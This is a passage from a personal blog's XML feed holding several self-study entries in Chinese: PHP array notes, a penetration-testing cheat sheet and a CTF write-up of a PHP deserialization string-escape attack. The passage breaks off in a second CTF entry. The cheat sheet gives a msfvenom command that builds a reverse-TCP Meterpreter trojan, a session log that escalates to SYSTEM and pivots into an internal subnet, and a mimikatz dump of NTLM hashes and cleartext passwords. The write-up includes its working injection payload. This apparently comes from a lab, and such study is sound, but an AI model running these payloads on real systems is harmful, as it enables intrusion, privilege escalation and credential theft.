class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Some text&quot;</span>; <span class="hljs-meta">?&gt;</span><br>No newline<br><span class="hljs-meta">&lt;?=</span> <span class="hljs-string">&quot;But newline now&quot;</span> <span class="hljs-meta">?&gt;</span><br><span class="hljs-comment"># 结果输出  Some textNo newline</span><br><span class="hljs-comment">#   But newline now</span><br>    <br><span class="hljs-comment">#注意: 如果想查看某个表达式的值和类型，用 var_dump() 函数。</span><br><br><span class="hljs-comment">#如果只是想得到一个易读懂的类型的表达方式用于调试，用 gettype() 函数。要检验某个类型，不要用 gettype()，而用 is_type 函数</span><br>    <br><span class="hljs-comment">#如果要将一个变量强制转换为某类型，可以对其使用强制转换或者 settype() 函数。</span><br><br><span class="hljs-comment">#-1 和其它非零值（不论正负）一样，转换为bool值时，被认为是 true！</span><br>    <br>round() <span class="hljs-comment">#四舍五入</span><br>    (<span class="hljs-keyword">int</span>)  <span class="hljs-comment">#向下取整</span><br>    (<span class="hljs-keyword">string</span>) <span class="hljs-comment">#</span><br>    strval()<span class="hljs-comment">#变字符串</span><br>    <br>        <br><span class="hljs-comment">#String 中包含有效的十进制 int，除非数字前面有一个 + 号，否则将被转换为 int 类型。例如键名 &quot;8&quot; 实际会被储存为 8。另外， &quot;08&quot; 不会被强制转换，因为它不是一个有效的十进制整数。</span><br><span class="hljs-comment">#Float 也会被转换为 int ，意味着其小数部分会被舍去。例如键名 8.7 实际会被储存为 8。</span><br><span class="hljs-comment">#Bool 也会被转换成 int。即键名 true 实际会被储存为 1 而键名 false 会被储存为 0。</span><br><span class="hljs-comment">#Null 会被转换为空字符串，即键名 null 实际会被储存为 &quot;&quot;。</span><br><span class="hljs-comment">#Array 和 object 不能 被用为键名。坚持这么做会导致警告：Illegal offset type。</span><br>    <br><br><span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-number">1</span>    =&gt; <span class="hljs-string">&quot;a&quot;</span>,<br>    <span class="hljs-string">&quot;1&quot;</span>  =&gt; <span class="hljs-string">&quot;b&quot;</span>,<br>    <span class="hljs-number">1.5</span>  =&gt; <span class="hljs-string">&quot;c&quot;</span>,<br>    <span class="hljs-literal">true</span> =&gt; <span class="hljs-string">&quot;d&quot;</span>,<br>);<br>var_dump(<span class="hljs-variable">$array</span>);<br><br><span class="hljs-comment">#结果</span><br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;d&quot;</span><br>&#125;<br>    <br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>(<br>         <span class="hljs-string">&quot;a&quot;</span>,<br>         <span class="hljs-string">&quot;b&quot;</span>,<br>    <span class="hljs-number">6</span> =&gt; <span class="hljs-string">&quot;c&quot;</span>,<br>         <span class="hljs-string">&quot;d&quot;</span>,<br>);<br>var_dump(<span class="hljs-variable">$array</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;a&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;b&quot;</span><br>  [<span class="hljs-number">6</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;c&quot;</span><br>  [<span class="hljs-number">7</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;d&quot;</span><br>&#125;<br><br><span class="hljs-comment">//</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-number">1</span>    =&gt; <span class="hljs-string">&#x27;a&#x27;</span>,<br>    <span class="hljs-string">&#x27;1&#x27;</span>  =&gt; <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-comment">// 值 &quot;a&quot; 会被 &quot;b&quot; 覆盖</span><br>    <span class="hljs-number">1.5</span>  =&gt; <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-comment">// 值 &quot;b&quot; 会被 &quot;c&quot; 覆盖</span><br>    -<span class="hljs-number">1</span> =&gt; <span class="hljs-string">&#x27;d&#x27;</span>,<br>    <span class="hljs-string">&#x27;01&#x27;</span>  =&gt; <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-comment">// 由于这不是整数字符串，因此不会覆盖键名 1</span><br>    <span class="hljs-string">&#x27;1.5&#x27;</span> =&gt; <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-comment">// 由于这不是整数字符串，因此不会覆盖键名 1</span><br>    <span class="hljs-literal">true</span> =&gt; <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-comment">// 值 &quot;c&quot; 会被 &quot;g&quot; 覆盖</span><br>    <span class="hljs-literal">false</span> =&gt; <span class="hljs-string">&#x27;h&#x27;</span>,<br>    <span class="hljs-string">&#x27;&#x27;</span> =&gt; <span class="hljs-string">&#x27;i&#x27;</span>,<br>    <span class="hljs-literal">null</span> =&gt; <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-comment">// 值 &quot;i&quot; 会被 &quot;j&quot; 覆盖</span><br>    <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-comment">// 值 “k” 的键名被分配为 2。这是因为之前最大的整数键是 1</span><br>    <span class="hljs-number">2</span> =&gt; <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-comment">// 值 &quot;k&quot; 会被 &quot;l&quot; 覆盖</span><br>);<br><br>var_dump(<span class="hljs-variable">$array</span>);<br><span class="hljs-meta">?&gt;</span><br>    <br>    <br>    <span class="hljs-keyword">unset</span>()<span class="hljs-comment">#删除数组或者数组中某个键值对</span><br>    array_values()<span class="hljs-comment">#重建索引</span><br>    <br>    <br><span class="hljs-comment">// 创建一个简单的数组</span><br><span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>);<br>print_r(<span class="hljs-variable">$array</span>);<br><br><span class="hljs-comment">// 现在删除其中的所有元素，但保持数组本身不变:</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$i</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$array</span>[<span class="hljs-variable">$i</span>]);<br>&#125;<br>    <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>not a big deal</category>
      
    </categories>
    
    
    <tags>
      
      <tag>orz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>searchinging</title>
    <link href="/2022/05/13/searching/"/>
    <url>/2022/05/13/searching/</url>
    
    <content type="html"><![CDATA[<p>Intranet and Internet</p><p>1.使用      arp -scan -l       命令，来探测同一局域网内的存活主机</p><p>2.使用netdiscover -i eth0</p><p><a href="https://blog.csdn.net/qq_45584159/article/details/111180728">something….</a></p><h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap:"></a>nmap:</h1><p>主机发现：<br>nmap -sn 网段(192.168.64.0/24)</p><p>端口扫描：<br>nmap -sS -p 1-1000 ip地址 (这里只扫描了前1000的端口)<br>Nmap -sV -p- ip地址 (这里是扫描所有的端口)</p><p>系统扫描：<br>nmap -O 192.168.64.142</p><p>版本扫描：<br>nmap -sV 192.168.64.142</p><p>综合扫描：<br>nmap -A 192.168.64.142</p><p>扫描整个网段(ping 扫描)<br>nmap -sn 192.168.64.0/24</p><p>我们利用Nmap执行全端口扫描<br>Nmap -sV -p- 192.168.64.142</p><h1 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h1><p>生成木马：</p><p>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.102 LPORT=6666 -f exe -o runme.exe</p><p>并在目标主机上运行，本机开启监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br>payload =&gt; windows/x64/meterpreter/reverse_tcp<br>msf6 exploit(multi/handler) &gt; show options <br><br>Module options (exploit/multi/handler):<br><br>   Name  Current Setting  Required  Description<br>   ----  ---------------  --------  -----------<br><br><br>Payload options (windows/x64/meterpreter/reverse_tcp):<br><br>   Name      Current Setting  Required  Description<br>   ----      ---------------  --------  -----------<br>   EXITFUNC  process          yes       Exit technique (Accepted: <span class="hljs-string">&#x27;&#x27;</span>, seh, thread, process, none)<br>   LHOST     192.168.0.102    yes       The listen address (an interface may be specified)<br>   LPORT     6666             yes       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Wildcard Target<br><br><br>msf6 exploit(multi/handler) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.0.102:6666 <br>[*] Sending stage (200262 bytes) to 192.168.0.104<br>[*] Meterpreter session 6 opened (192.168.0.102:6666 -&gt; 192.168.0.104:49273) at 2022-10-01 16:02:26 +0800<br><br>meterpreter &gt; getuid<br>Server username: SUN\administrator<br>meterpreter &gt; getsystem<br>...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).<br>meterpreter &gt; getuid<br>Server username: NT AUTHORITY\SYSTEM<br><br><br><br><br><br><span class="hljs-comment">#通过background退出的会话可以通过</span><br>sessions -i 4<span class="hljs-comment">#重新进入</span><br><br><br><span class="hljs-comment">#拿下一台主机添加路由进入内网，发现新主机</span><br>msf6 exploit(multi/handler) &gt; route add 192.168.138.0 255.255.255.0 6<br>[*] Route added<br>msf6 exploit(multi/handler) &gt; route<br><br>IPv4 Active Routing Table<br>=========================<br><br>   Subnet             Netmask            Gateway<br>   ------             -------            -------<br>   192.168.138.0      255.255.255.0      Session 6<br><br>[*] There are currently no IPv6 routes defined.<br>msf6 exploit(multi/handler) &gt; use auxiliary/scanner/discovery/udp_sweep<br>msf6 auxiliary(scanner/discovery/udp_sweep) &gt; show options <br><br>Module options (auxiliary/scanner/discovery/udp_sweep):<br><br>   Name       Current Setting   Required  Description<br>   ----       ---------------   --------  -----------<br>   BATCHSIZE  256               yes       The number of hosts to probe <span class="hljs-keyword">in</span> each <span class="hljs-built_in">set</span><br>   RHOSTS     192.168.138.0/24  yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="hljs-string">&#x27;file:&lt;path&gt;&#x27;</span><br>   THREADS    10                yes       The number of concurrent threads<br><br>msf6 auxiliary(scanner/discovery/udp_sweep) &gt; exploit<br><br>[*] Sending 13 probes to 192.168.138.0-&gt;192.168.138.255 (256 hosts)<br>[*] Discovered NetBIOS on 192.168.138.136:137 (WIN7:&lt;00&gt;:U :SUN:&lt;00&gt;:G :WIN7:&lt;20&gt;:U :00:0c:29:ce:6e:01)<br>[*] Discovered NetBIOS on 192.168.138.138:137 (DC:&lt;00&gt;:U :SUN:&lt;00&gt;:G :SUN:&lt;1c&gt;:G :DC:&lt;20&gt;:U :SUN:&lt;1b&gt;:U :00:0c:29:34:b5:08)<br>[*] Discovered DNS on 192.168.138.138:53 (Microsoft DNS)<br>[*] Discovered NTP on 192.168.138.138:123 (1c0104fa00000000000a430a4c4f434ce6e22159ad6fa9dcc54f234b71b152f3e6e274782ae04db3e6e274782ae04db3)<br>[*] Scanned 256 of 256 hosts (100% complete)<br>[*] Auxiliary module execution completed<br><br><br><br><span class="hljs-comment">#获取密码</span><br>meterpreter &gt; load kiwi<br>Loading extension kiwi...<br>  .<span class="hljs-comment">#####.   mimikatz 2.2.0 20191125 (x64/windows)</span><br> .<span class="hljs-comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br> <span class="hljs-comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br> <span class="hljs-comment">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br> <span class="hljs-string">&#x27;## v ##&#x27;</span>        Vincent LE TOUX            ( vincent.letoux@gmail.com )<br>  <span class="hljs-string">&#x27;#####&#x27;</span>         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/<br><br>Success.<br>meterpreter &gt; creds_all<br>[+] Running as SYSTEM<br>[*] Retrieving all credentials<br>msv credentials<br>===============<br><br>Username       Domain  LM                                NTLM                              SHA1<br>--------       ------  --                                ----                              ----<br>Administrator  SUN     7f4f68bb8a5cc7b9e9260223765451f1  b208972c810e7f4ac24fb7f7189796f6  6b1c656c95764b5613d0e11c02dd951b01d98293<br>WIN7$          SUN                                       5015c1f2fa4c2de6e68724915f78d226  1e10562107136265e348e6b61e5ee28a4cb98ad0<br>leo            SUN     b73a13e9b7832a35aad3b435b51404ee  afffeba176210fad4628f0524bfe1942  fa83a92197d9896cb41463b7a917528b4009c650<br><br><br>kerberos credentials<br>====================<br><br>Username       Domain   Password<br>--------       ------   --------<br>(null)         (null)   (null)<br>administrator  SUN.COM  dc456.com<br>leo            SUN.COM  123.com<br>win7$          SUN.COM  b3 11 a3 db fe bb f0 bb 63 21 56 5b 64 17 81 5e c6 b7 77 88 9b e6 ed 73 2e 73 5b 29 17 ce 66 08 ca ce ce ba 26 bd 08 e1 b1 45 e2 ca ae 03 54 16 42 9d 67 e0 9f 2d c7 d6 09 24 1a ba 9d e3 61 f6 43 62 ea 9a c5 96 91 8e 21 40 a8 8b 0f 3f 2b 65 60 45 17 dc 9c 7e e9 be 34 4e 2f a1 99 40 19 36 7f 6d 5d 2e fb 1f 44 6f 8c dd d0 53 37 28 71 49 01 36 6a e0 7a f6 0f ae 9d d7 17 d9 77 4f 05 7a 80 88 da f7 58 a8 21 2f 41 1f 82 fe ef 19 37 c2 76 11 22 e1 c3 bd <span class="hljs-built_in">fc</span> 1e ba 98 12 d4 96 05 9c ba 35 8e 7b f1 0c 31 0d 53 da e0 af 7c 1b b8 ea cc 80 ef 0c 1b f0 81 6a c5 93 95 99 e0 01 a9 2f 8d 7f e7 e8 36 <span class="hljs-built_in">fc</span> 65 5c f0 8b 8b f0 ed 40 08 9a d5 08 6f 96 5a 74 55 f3 b4 0d dd 03 45 18 44 7f 25 57 8d 31 30 a7 4a 16 1d 90 2e 50 5e 9a 3d 18 44   <br><br><br><br>   <br>   <br>   <br><br></code></pre></td></tr></table></figure><h1 id="上线cobaltstrike"><a href="#上线cobaltstrike" class="headerlink" title="上线cobaltstrike"></a>上线cobaltstrike</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://blog.csdn.net/qq_36241198/article/details/121668010<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>self study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>just a little</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java</title>
    <link href="/2022/03/03/java/"/>
    <url>/2022/03/03/java/</url>
    
    <content type="html"><![CDATA[<p>it is empty now!</p>]]></content>
    
    
    <categories>
      
      <category>self study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>just a little</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>exercise</title>
    <link href="/2022/02/13/exercise/"/>
    <url>/2022/02/13/exercise/</url>
    
    <content type="html"><![CDATA[<p>ALL KINDS OF</p><h1 id="1-BUUCTF—-WP"><a href="#1-BUUCTF—-WP" class="headerlink" title="1.BUUCTF—-WP"></a>1.BUUCTF—-WP</h1><h2 id="1-安洵杯-2019-easy-serialize-php"><a href="#1-安洵杯-2019-easy-serialize-php" class="headerlink" title="1.[安洵杯 2019]easy_serialize_php"></a>1.[安洵杯 2019]easy_serialize_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<span class="hljs-comment">#获取一个参数</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<span class="hljs-comment">#将数组中出现过的替换为空</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><br>extract(<span class="hljs-variable">$_POST</span>);<span class="hljs-comment">#这里有一个变量覆盖，前面SESSION中的所有的键值都会清空，从而只看post提交的</span><br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$function</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><br><br><br><span class="hljs-comment">#这里先进行传参后序列化，再过滤，看filter函数，正则替换为空，导致这里序列化缩短漏洞</span><br><br><br><span class="hljs-comment">#---------------------------------------------------------------</span><br><span class="hljs-comment">#原理:因为序列化的字符串是严格的，对应的格式不能错，比如s:4:&quot;name&quot;,那s:4就必须有一个字符串长度是4的否则就往后要。</span><br><span class="hljs-comment">#并且unserialize会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号后面的就都被扔掉。</span><br><span class="hljs-comment">#---------------------------------------------------------------</span><br><br><br><span class="hljs-comment">#----------------------------------------------------------------</span><br><span class="hljs-comment">#利用unserialize会把  &#125;  后面多余 的当垃圾处理 这里采用字符串逃逸的方式</span><br><span class="hljs-variable">$_SESSION</span>[phpflag]=<span class="hljs-string">&#x27;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mbGxsbGxsYWc=&quot;;&#125;&#x27;</span>;<br><span class="hljs-comment">#首先  POST  传参</span><br>_SESSION[phpflag]=;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mbGxsbGxsYWc=&quot;</span>;&#125;<br><span class="hljs-comment">#并且  get   传参</span><br>?f=show_image<br><span class="hljs-comment">#解释post,在serialize($_SESSION)=</span><br>a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpflag&quot;</span>;s:<span class="hljs-number">48</span>:<span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="hljs-string">&quot;;&#125;&quot;</span>;&#125;<br><span class="hljs-comment">#当phpflag被filter替换为空后，</span><br>a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;    &quot;</span>;s:<span class="hljs-number">48</span>:   <span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="hljs-string">&quot;;&#125;    &quot;</span>;&#125;<br><span class="hljs-comment">#   &quot;;s:48:  被当成一个键，值是  s:1:&quot;1&quot;;   ZDBnM19mMWFnLnBocA==  d0g3_f1ag.php的base64</span><br><span class="hljs-comment">#那么新的键值-----&gt;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;就出来了，从而可以包含文件</span><br><br><span class="hljs-comment">#访问页面发现   $flag = &#x27;flag in /d0g3_fllllllag&#x27;;</span><br><span class="hljs-comment">#于是继续包含   /d0g3_fllllllag  文件，base64后发现还是20个字符，所以不需要改字符多少，直接带入可以包含文件，拿到flag</span><br><span class="hljs-comment">#flag&#123;60d2d349-36a6-43c0-97f1-90165f3ee274&#125;</span><br><span class="hljs-comment">#---------------------------------------------------------------</span><br><span class="hljs-variable">$serialize_info</span> = filter(serialize(<span class="hljs-variable">$_SESSION</span>));<br><span class="hljs-comment">#这里可以知道，我门需要设置f=show_image  才能本地包含到文件</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br>    highlight_file(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>    <span class="hljs-comment">#这里的提示我们去查看phpinfo </span><br>    <span class="hljs-comment">#auto_append_filed0g3_f1ag.phpd0g3_f1ag.php</span><br>    <span class="hljs-comment">#于是猜测flag应该在这个文件里面，需要包含这个文件</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br>    <span class="hljs-variable">$userinfo</span> = unserialize(<span class="hljs-variable">$serialize_info</span>);<br>    <span class="hljs-keyword">echo</span> file_get_contents(base64_decode(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-De1CTF-2019-SSRF-Me"><a href="#2-De1CTF-2019-SSRF-Me" class="headerlink" title="2.[De1CTF 2019]SSRF Me"></a>2.[De1CTF 2019]SSRF Me</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 